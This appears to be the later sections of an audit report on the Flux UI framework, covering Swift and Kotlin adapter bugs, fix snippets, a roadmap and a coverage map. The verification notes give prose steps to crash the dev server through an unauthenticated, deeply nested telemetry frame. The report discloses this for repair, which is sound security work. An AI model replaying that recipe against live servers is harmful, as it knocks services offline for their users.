### [🟡 MEDIUM] PARITY — Absent-prop semantics diverge (Swift retains, Kotlin clears); Picker (iOS) never reloads and wipes on absent
- Files: `adapters/ui-swift/Sources/FluxUIKit/TextAdapter.swift` : 31 (+ `ButtonAdapter.swift` : 33) vs `adapters/ui-kotlin/.../TextAdapter.kt` : 27-28 (+ `ButtonAdapter.kt` : 27-28); `adapters/ui-swift/Sources/FluxUIKit/PickerAdapter.swift` : 40-47
- For the same patch that drops the `text` prop, iOS keeps the old string while Android renders `""` — a server-side reset leaves stale labels on iOS and blanks on Android (same for `Button` title). The Swift kit is even self-inconsistent (`Column`/`Grid` gap resets to 0; Switch/Sampler retain). The iOS picker mutates the data source without `reloadAllComponents()` (stale wheel rows; `selectRow` can target nonexistent rows) and `?? []` wipes the list when `items` is absent — contradicting the "Audit D14: absent prop retains previous value" comment three lines below.
- Fix: pick one policy (retain-on-absent per D14) on both platforms; on iOS:
```swift
if let newItems, newItems != source?.items {
    source?.items = newItems
    view.reloadAllComponents()
    view.selectRow(min(view.selectedRow(inComponent: 0), max(newItems.count - 1, 0)), inComponent: 0, animated: false)
}
```

### [🟡 MEDIUM] BUG — Gesture "error" state still attaches a functional long-press recognizer (both platforms, differently wrong)
- Files: `adapters/ui-swift/Sources/FluxUIKit/GestureAdapter.swift` : 37-48, 87-95, 145; `adapters/ui-kotlin/.../GestureAdapter.kt` : 33-46
- On missing/unknown `kind`, iOS falls through `recognizerClass(for:)`'s `default:` arm to a real `UILongPressGestureRecognizer` that gets bound — an invalid node still responds to gestures. Kotlin sets `PROP_ERROR` but never clears a previously-valid `PROP_KIND`, so the host keeps the stale recognizer plus an error flag. `GestureEnvironment.error` is write-only on iOS — the "surfaces to overlay" comment is unimplemented.
- Fix: on error, remove any existing recognizer and bind nothing (Swift: `if let existing = recognizer { view.removeGestureRecognizer(existing); self.recognizer = nil }`); Kotlin: `view.setProperty(PROP_KIND, null)` on error paths; render the error minimally (e.g. `accessibilityLabel = error` + disable interaction).

### [🟡 MEDIUM] BUG — Router (iOS): no view-controller containment; all-or-nothing cast silently aborts
- File: `adapters/ui-swift/Sources/FluxUIKit/RouterAdapter.swift` : 21-52, 66-70, 86-92
- `embedNavController()` only does `addSubview` + constraints — no `addChild(nav)` / `nav.didMove(toParent:)`, so `viewWillAppear`/rotation/status-bar propagation never reach the host hierarchy, and `destroy` calls `nav.removeFromParent()` on a controller that was never a child. `setChildren`'s `guard let screens = children as? [UIViewController] else { return }` — one bad element silently aborts the whole navigation update with no log.
- Fix:
```swift
func embedNavController(on parent: UIViewController) {
    guard nav.parent == nil else { return }
    parent.addChild(nav); addSubview(nav.view); /* constraints */ nav.didMove(toParent: parent)
}
// setChildren:
let screens = children.compactMap { $0 as? UIViewController }
assert(screens.count == children.count, "Router received non-VC child: \(children)")
if screens.isEmpty { return }
view.nav.setViewControllers(screens, animated: false)
```

### [🟡 MEDIUM] BUG — `ImageAdapter` (iOS): load race with no cancellation token; `frame.size` set inside a constraint-managed hierarchy
- File: `adapters/ui-swift/Sources/FluxUIKit/ImageAdapter.swift` : 58-60, 70-72, 83-85, 93-114
- Each `update` spawns an unstructured `Task { @MainActor in await self.load(...) }`; rapid prop changes start overlapping loads and an *older* fetch that completes last overwrites the newer image (stale bitmap — the comment claiming "a recycled view simply shows the latest" is not enforced). `destroy` doesn't cancel in-flight work. `view.frame.size = CGSize(...)` is meaningless under Auto Layout (every adapter sets `translatesAutoresizingMaskIntoConstraints = false`), and the mechanism diverges from Kotlin's recorded `imageWidth/imageHeight` props.
- Fix: generation-token loads:
```swift
private var generation = 0
// update: generation += 1; let gen = generation
Task { @MainActor [weak self] in
    guard let self, gen == self.generation else { return }
    let image = await Self.decode(...)          // off-main, downsampled via ImageIO
    guard gen == self.generation else { return }
    view.image = image
}
```
Replace the frame write with stored width/height `NSLayoutConstraint`s and record `FluxRecordedProp.size` for host parity.

### [🟡 MEDIUM] BUG — `FluxColor`/`FluxFont.toRecord()` encode with FNV-name indices but every decoder reads positionally
- Files: `adapters/ui-kotlin/src/main/kotlin/dev/flux/ui/FluxStyle.kt` : 15-23, 37-43; `Props.kt` : 57-86
- `toRecord()` writes `Field(PropsIndex.COLOR_RED, …)` (FNV digests of `"red"`…) while `Props.getColor`/`getFont` decode strictly positionally (`floatAt(0..3)`). Any record built by `toRecord()` is undecodable by the kit's own accessors.
- Fix: encode positionally (`Field(0u, Float(red)) … Field(3u, Float(alpha))`) or delete `toRecord` (it currently has no caller in the kit).

### [🟡 MEDIUM] BUG — Swift `Screen`/`Container`/`SafeArea` stack multiple children onto identical edge constraints (overdraw); `WebHost` src validation diverges per platform
- Files: `adapters/ui-swift/Sources/FluxUIKit/ScreenAdapter.swift` : 28-48; `ContainerAdapter.swift` : 32-56; `LayoutAdapters.swift` : 202-215; `WebHostView.swift` : 42-53 vs `adapters/ui-kotlin/.../WebViewAdapter.kt` : 30-44
- All three adapters loop over children pinning *each* to the same anchors — any multi-child node renders stacked/overdrawn (Kotlin renders flow/overlay). iOS `WebHost` requires `src` to parse as absolute http(s), else `loadHTMLString("", baseURL: nil)` **on every patch while src is absent**; Android records any string — same node, blank page on iOS, mounted view on Android.
- Fix: wrap multi-child containers in a `UIStackView` (or z-overlay for Stack semantics); enforce Screen's single-child invariant with an assert; share one src-validation rule (prefer host-side) and diff the clear path (`if clear && view.url != nil { view.loadHTMLString(...) }`).

### [🟡 MEDIUM] PERF — Kotlin child-list primitives are O(n²); five adapters use O(n·m) child lookups; WebViewAdapter re-hashes `"src"` per update
- Files: `adapters/ui-kotlin/.../FluxNativeViewImpl.kt` : 47 (+ `FluxNativeView.kt` : 40-47, `Reconcile.kt` : 31-41); `ScreenAdapter.kt` : 37; `OverlayMotionAdapters.kt` : 41, 84, 125, 178; `WebViewAdapter.kt` : 34
- `children()` returns a full copy per call; the default `clearChildren()` loops `removeChildAt(childCount() - 1)` — two list copies per removed child → O(n²) allocations per reconcile/destroy of large containers. `Screen`/`Modal`/`Sheet`/`Dialog`/`Animate` pass `{ id -> children.firstOrNull { it.nodeId == id } }` (linear scan per target) instead of an `associateBy` map like their siblings. `WebViewAdapter` recomputes `propIndexForName("src")` (FNV + alloc) per reconcile — the only adapter hashing per call.
- Fix: expose constant-time primitives (`override fun childCount() = childViews.size`; O(1) clear), build the lookup map once (`val byId = children.associateBy { it.nodeId }`), and hoist `private val WEBVIEW_SRC: UShort = propIndexForName("src")`.

### [🟡 MEDIUM] SMELL — Stale tests prove production drift; no-handler sentinel diverges; `Props.hash` is process-random; accessibility applied by 2 of ~27 adapters
- Files: `adapters/ui-swift/Tests/FluxUIKitTests/TextInputAdapterTests.swift` : 28; `LayoutOverlayAdapterTests.swift` : 19-21; `Props.kt` : 51-55 vs `Props.swift` : 54-56; `Props.swift` : 12-29, 127-130; `TextInputAdapter.kt` : 24-40 / `TextAreaAdapter.kt` : 23-41 / `CheckboxAdapter.kt` : 23-36 (vs `TextAdapter.kt` : 54, `ButtonAdapter.kt` : 38) and the Swift mirrors
- The Swift test suite invokes the deleted `textFieldDidChangeSelection` API (cannot compile — the suite that should have caught the CRITICAL TextInput regression isn't running) and `testStackSetsSpacingFromGap` asserts `stack.spacing == 8` while `StackAdapter.update` only records the gap. Kotlin collapses "no handler" into sentinel `0u` while Swift uses `nil`. `Props.hash` doc says "stable content hash (BLAKE3 in the IR)" but it's seeded from Swift's per-process-random `Hasher`. `applyAccessibility` is invoked only by Text/Button on both platforms — form controls silently drop `label`/`role`/`focusOrder` (FLUX-044 documents them as kit-wide).
- Fix: restore the suite to compilable state and reconcile behaviors; prefer `getHandlerOrNull(): UInt?`; compute the digest with FNV-1a-64 over sorted `(index, value)` encodings; call accessibility from a shared base/protocol-extension template method.

### [🔵 LOW] BUG — WebHost navigation policy unenforced (no `decidePolicyFor`); dev transport is plain http; Checkbox glyph prepends cumulatively
- Files: `adapters/ui-swift/Sources/FluxUIKit/WebHostView.swift` : 31-40, 70-76; `ImageAdapter.swift` : 34; `ImageCache.swift` : 93-104; `CheckboxAdapter.swift` : 33-41, 55-58
- The WKNavigationDelegate implements only the two `didFail` callbacks — the loaded page can navigate anywhere (no allow-list), while `ImageCache.resolveURL` forwards any absolute http(s) URL from the server-controlled `source` prop and `assetBaseURL` is `http://localhost:7332` (cleartext/ATS territory). `applyGlyph` builds `glyph + " " + view.title(...)` from the *current* title which already contains the previous glyph — with no label the title grows `"☐" → "☐ ☐" → "☐ ☐ ☐"…` unbounded; with a label the glyph only appears one update late.
- Fix: implement `decidePolicyFor` with an allow-list host and restrict image sources to loopback in dev; compose the glyph from stored state:
```swift
private func applyGlyph(_ view: UIButton, label: String?) {
    view.setTitle((view.isSelected ? "☑︎" : "☐") + (label.map { " \($0)" } ?? ""), for: .normal)
}
```

### [🔵 LOW] PERF — iOS reconcilers use `firstIndex(of:)` inside reorder loops; images decoded on main actor without downsampling
- Files: `adapters/ui-swift/Sources/FluxUIKit/ColumnAdapter.swift` : 73-89 (line 83); `GestureAdapter.swift` : 113-129 (line 123); `ImageAdapter.swift` : 104-110
- Both helpers are copy-paste variants doing O(n²) index lookups per reconcile pass. `UIImage(data:)` runs on the `@MainActor` per load with no downsampling — large dev assets cause main-thread decode hitches exactly when a list of images mounts.
- Fix: build a `[UIView: Int]` position map once per pass and unify the helpers; decode via `ImageIO` thumbnailing (`kCGImageSourceThumbnailMaxPixelSize = max(bounds) * scale`) off-main.

### [🔵 LOW] DESIGN — Copy-paste leaf adapters on both platforms; `FluxUiKit` doc claims "9 adapters", registers 27; `FluxFount` vs `FluxFont`; magic numbers everywhere; redundant setProperty guards
- Files: `adapters/ui-kotlin/.../{SwitchAdapter,ToggleAdapter,CheckboxAdapter,SliderAdapter,PickerAdapter,DatePickerAdapter,TextAreaAdapter}.kt`; `adapters/ui-swift/Sources/FluxUIKit/{Switch,Toggle,Checkbox,Slider,DatePicker}Adapter.swift`; `FluxUiKit.kt` : 21-58; `Font.swift` : 11 vs `FluxStyle.kt` : 31; `TextAdapter.swift` : 57, 60; `TextAreaAdapter.swift` : 31, 34, 48; `CheckboxAdapter.swift` : 56; `DatePickerAdapter.swift` : 50; `TextAdapter.kt` : 28-51 (+ every leaf adapter) vs `FluxNativeViewImpl.kt` : 49-57; `FluxUIKit.swift` : 6-8
- Each form adapter repeats identical read/compare/set/bind/destroy boilerplate — precisely how the Checkbox stale-payload bug and the inconsistent absent-prop policies crept in. The KDoc count is stale on both platforms; `FluxFount`/`FluxFont` naming diverges; font sizes/radii/glyphs/millis-conversion are inline literals that already drift (Kotlin records no default font; iOS hardcodes 14/17; `Int64(t * 1000)` truncates instead of rounding); every Kotlin adapter double-checks comparisons `setProperty` already performs (~60 copies).
- Fix: introduce `abstract class FluxControlAdapter<V>(valueIndex, enabledIndex, handlerIndex, handlerKey)` implementing `update`/`bindHandler`/`destroy` once; drop the count claims; rename Swift `FluxFount` → `FluxFont` (deprecated typealias); hoist defaults into a shared `FluxDefaults` on each platform fed by the wire doc; use `.rounded()` for millis; delete the redundant guards and rely on `setProperty`'s change flag.

### [⚪ NIT] — `ENTRY_GAS` UI magic number (see §9); duplicated/typo'd header comment in `FluxUIKit.swift` : 6-8 ("plus the nine /// the nine declarative adapters")
---

## 12. Verification notes & what held up well

Credit where due — these areas were probed and **held up**:

- **Parser robustness**: `parser.rs` : 50-58, 925-933 implements `MAX_NESTING_DEPTH` + `MAX_PARSE_DEPTH` guards returning diagnostics — the classic nested-input stack overflow is handled (T-604.2).
- **Wire decode memory guards**: `Reader::ensure_capacity` (`wire/cursor.rs` : 105-119), `MAX_FRAME_BYTES` ceiling (`frame.rs` : 241-247), protocol-version fail-closed (`frame.rs` : 227-234) — the LANE-D hardening is real (the *value-recursion* hole in §3 is the one it missed).
- **Dispatch index** (`dispatch.rs`): rebuild-wholesale semantics, degradation guard, and tests are exemplary; the only real cost is what surrounds it (§6.5).
- **Asset server** (`assets.rs`): traversal + symlink-escape guards with tests — textbook.
- **VM decode** (`vm-ref/src/decode.rs`): total, `unsafe`-free, truncation-safe.
- **Differ fast paths**: `children_hash`/`props_equal` short-circuits (`algorithm.rs` : 49-70) avoid per-node allocations for unchanged trees — the FLUX-079/LANE-H work does what it says.
- **Incremental lowering** (`pipeline.rs` : 604-670): per-file cache with `lower_count` bounded-work metric — verified by tests.

**How to reproduce the two DoS findings safely**: build `flux-devserver` with `cargo run --features ... dev`, connect a raw TCP socket to `:7331`, complete a `Hello` (no token by default), then send a `Telemetry` frame whose 17th event register value is a 60 000-deep nested `TAG_LIST` chain (~180 KB) — the process aborts with a stack overflow on the decode path (`telemetry.rs` : 341 → `wire/value.rs` : 90).

---

## 13. Cross-cutting themes (root causes, not just symptoms)

1. **Two sources of truth keep drifting.** `normalize_view_name`/`is_container` (codegen vs parity), `binop_symbol` (`" + "` vs `" ? "` fallbacks), `canonicalize_expr` (ordering differs), `render_expr` helpers triplicated, the prelude list copied twice in the parity guard plus once in `flux-types`, and the CI awk length-heuristic vs doctor's depth-0-only scanner. Every drift found here was *already observable* — none needed a hypothetical future change.
   → **Structural fix**: one canonical module per concept, consumed by both sides; add a CI test that fails when `flux-parity`'s copies stop being byte-identical to `flux-codegen-core`'s.

2. **Generated-code validity is asserted nowhere.** The Kotlin named-arg bug (§8), the Row-gap parameter bug, the FLUX-040 form shapes, the `<T>`-less generic fallback, and `Binding` literal setters all produce non-compiling output *today*, while the parity recognizers are permissive (`:` or `=`, escape-blind tokenizer, `unwrap_or_default` bodies) and keep CI green.
   → **Structural fix**: compile (or at least syntax-check via `kotlinc -Xexpect-actual` / `swiftc -parse`) one golden per primitive in CI; make the recognizers strict per language.

3. **Escaping is discipline, not infrastructure.** `escape_text` exists and is good, but `startDestination`, animation curves, and (historically) prop strings each bypassed it because the *call sites* decide.
   → **Structural fix**: make raw string interpolation a type error — only `B::string_literal(&str)` may produce quotes in generated code (lint + code review rule).

4. **Panics as error handling on encode paths.** `u16_len` (`cursor.rs` : 36-41), `expect` in `write_closures` (`frame.rs` : 180), `StringInternedFrame::new`'s assert, `LatencyMs::from_raw`'s assert — each turns a recoverable condition into a thread/process kill. The policy is documented ("panic the encode instead") but the callers aren't panic-safe.
   → **Structural fix**: `EncodeError`/`MetricError` results surfaced as `Error` frames or gate verdicts; keep asserts only for true invariants (the `STRING_ID_CANONICAL_CEILING` one is arguably right — it's a build guard, not input handling).

5. **The DevTools UI clones its way through every frame.** Per-cell snapshot clones, O(n²) reconstruction, triple node clones, re-sorted perf records, O(n) ring evictions. Individually small; together they cap the event rate the UI can absorb well below what the server emits.
   → **Structural fix**: snapshot-once-per-render delegates (store the `Vec` in the delegate), `Arc<[T]>` frames, checkpointed reconstruction, `VecDeque` buffers.

6. **The two native kits implement the same contract independently.** That's the design, but every divergence found (font slots, nodeId scoping, absent-prop policy, handler accumulation, gesture error handling, WebHost validation) is a place where a *shared conformance test suite* (the parity harness already exists server-side!) could pin behavior.
   → **Structural fix**: port the `flux-parity` trace goldens into host-side tests (Kotlin `FluxTestKit` exists; give Swift the same runner) and run both against identical wire sequences.

---

## 14. Prioritized fix roadmap

**Sprint 1 — stop the bleeding (correctness + security):**
1. Depth-limit `decode_value` (§3.1) — remote abort of the whole server.
2. Topological insert ordering in the differ (§4.1) — silent tree corruption on edits.
3. iOS `TextInput` editingChanged relay + repair the Swift test suite (§11.1) — dead headline feature.
4. Kotlin named-arg rendering + backend `named_arg` hook (§8.1) — release builds don't compile.
5. `NEG_I64` wrapping_neg + ISA vector (§2.1).
6. `AsyncBridge.clear_session()` clearing `parked` (§6.2).
7. Fix `make-fixtures.ts` + i18n key mapping; regenerate the fixture (§10.1-10.2) — homepage crash + blank labels.
8. `ci-size-gate.sh` panic! regex (§10.3) — the gate is currently decorative for `panic!`.

**Sprint 2 — parity & performance:**
9. Unify `normalize_view_name`/`is_container`/`canonicalize_expr`/`binop_symbol` into one module (§8.2, §8 mid).
10. Wire `onValueChange`/form-control hooks for all Leaf primitives (§8.3).
11. Replace per-dispatch full string-table/closure re-ship with referenced-only payloads (§6.5); content-address string ids to stop per-compile reassignment.
12. DevTools snapshot-once delegates + checkpointed reconstruction + `VecDeque` buffers (§9).
13. Font slot fix in `TextAdapter` (§11.4); Kotlin `nodeId` threading (§11.5); UIAction dedupe + `removeAllActions` in destroy (§11.2-11.3).
14. Watch loop: filter `Modify(Access)`, sleep-then-drain (§6.7).

**Sprint 3 — hardening & hygiene:**
15. Constant-time token compare; DevTools command/host role separation + actually forward `DebugCommand`s (§6.3, §6.1); module-loader name validation (§6.4).
16. `EncodeError` results replacing `u16_len`/`expect` panics (§3.4, §3.3); `write_closures` id map.
17. `prop_index_for_name` registry + collision error (§5.1).
18. LSP: position-encoding negotiation, `position_to_offset` line-end clamp, `did_close`, per-URI AST cache (§9).
19. All 🔵 LOW / ⚪ NIT items in §8-§11 (dead code, stale comments, docs-vs-code, magic numbers).

---

## 15. Quick-wins appendix (one-liners, high value-per-line)

| File:Line | Fix |
|---|---|
| `flux-vm-ref/src/vm.rs:582` | `-v` → `v.wrapping_neg()` |
| `flux-differ/src/diff/tree.rs:85` | `referenced` Vec → `AHashSet` (O(n²)→O(n)) |
| `flux-devserver/src/pipeline/tree.rs:77` | same `AHashSet` fix for `root_ids` |
| `flux-devserver/src/watch.rs:196` | filter `Modify(ModifyKind::Data(_))` only |
| `flux-devserver/src/async_bridge.rs:127` | clear `parked` too (rename `clear_session`) |
| `flux-ir-serde/src/wire/value.rs:90` | thread `depth: usize` through `decode_value`, cap 128 |
| `flux-codegen-core/src/emitter.rs:731` | backend `named_arg` hook (Kotlin `=`) |
| `flux-codegen-core/src/emitter.rs:676` | `B::escape_text(route)` for `startDestination` |
| `flux-codegen-kotlin/src/backend_impl.rs:66` | `verticalAlignment = Alignment.CenterVertically` for Row |
| `flux-codegen-swift/src/backend_impl.rs:259` | unknown curve → `"Animation.default"` |
| `scripts/ci-size-gate.sh:223` | `\b(unwrap\|expect)\s*\(\|\bpanic!\s*\(` |
| `website/scripts/make-fixtures.ts:44` | `JSON.stringify(v)` |
| `crates/flux-cli/src/init.rs:52` | interpolate `{name}` into the config |
| `crates/flux-cli/src/lib.rs:110` | `--no-types` negatable flag |
| `editors/vscode/src/extension.ts:88` | `JSON.stringify(devBin)` around the binary path |
| `editors/vscode/src/extension.ts:50` | connect to `/devtools` endpoint |
| `scripts/wire-fixtures-gate.sh:78` | remove the pinned simulator UDID |
| `scripts/provision-compose.sh:47` | add `--max-time 60` to curls; wipe `$WORK/jars` per run |
| `adapters/ui-swift/.../PickerAdapter.swift:45` | call `reloadAllComponents()` after items change |
| `adapters/ui-kotlin/.../WebViewAdapter.kt:34` | hoist `WEBVIEW_SRC` constant |

---

## 16. Finding index by crate

| Crate/Area | 🔴 | 🟠 | 🟡 | 🔵 | ⚪ | Total |
|---|---|---|---|---|---|---|
| flux-vm-ref | — | 1 | 3 | 5 | — | 9 |
| flux-ir-serde (+parity decode) | 1 | — | 3 | 3 | — | 7 |
| flux-differ | 1 | — | 1 | 2 | — | 4 |
| flux-ir / flux-syntax | — | 1 | — | 2 | — | 3 |
| flux-parser / flux-types | — | — | — | 3 | 1 | 4 |
| flux-devserver | — | 2 | 7 | 4 | 1 | 14 |
| codegen-core/-kotlin/-swift | 1 | 4 | 9 | 9 | 4 | 27 |
| flux-parity (rest) | — | — | 2 | 4 | 1 | 7 |
| flux-devtools-ui / flux-lsp / flux-perf-harness | — | 4 | 11 | 9 | 1 | 25 |
| flux-cli / website / stdlib / scripts / gradle | 2 | 3 | 16 | 5 | 4 | 30 |
| adapters (Kotlin + Swift) | 1 | 5 | 10 | 5 | 2 | 23 |
| **Total** | **6** | **~20** | **~64** | **~51** | **~14** | **~155**+ |

*(Counts collapse duplicates that were reported once across sections; the narrative sections above are authoritative.)*

---

## 17. Appendix — review coverage map

| Component | Depth | Sections |
|---|---|---|
| flux-vm-ref (vm, decode, error) | Full manual read | §2 |
| flux-ir-serde (cursor, value, frame, patch, resume/telemetry decode paths) | Full manual read | §3 |
| flux-differ (algorithm, tree, emit) | Full manual read | §4 |
| flux-ir (lower/mod, prop_index), flux-syntax (value, opcode, fnv, node ids) | Full manual read | §5 |
| flux-devserver (server, session, watch, pipeline, tree, dispatch, async_bridge, assets, debug_bridge, config) | Full manual read | §6 |
| flux-parser (lexer, parser guards), flux-types (exhaust, spot checks) | Targeted read | §7 |
| flux-codegen-core/-kotlin/-swift, flux-parity | Agent pass A1 (all files) | §8 |
| flux-devtools-ui, flux-lsp, flux-perf-harness, vscode ext | Agent pass A2 (all files) | §9 |
| flux-cli, website TS, stdlib .flux, scripts, gradle | Agent pass A3 (all files) | §10 |
| adapters/ui-kotlin, adapters/ui-swift | Agent pass A4 (all 65 source files) | §11 |

*Not line-by-line audited (flagged for a follow-up pass):* `flux-types/src/checker/*` inference core (~2.5k LOC beyond the spot checks), `flux-ir/src/arena/content_address.rs` hashing internals, `flux-ir-serde/src/wire/node.rs` field-level encoding, gpui-dependent DevTools rendering internals (nightly-gated build), and the iOS/Android *host app* scaffolding under `runtimes/` (only the adapter libraries were in scope). The website's Rust-free TS was reviewed; `pnpm` lockfiles were not diffed for supply-chain risk (recommend `pnpm audit` + `cargo audit` as CI jobs — neither is configured today).
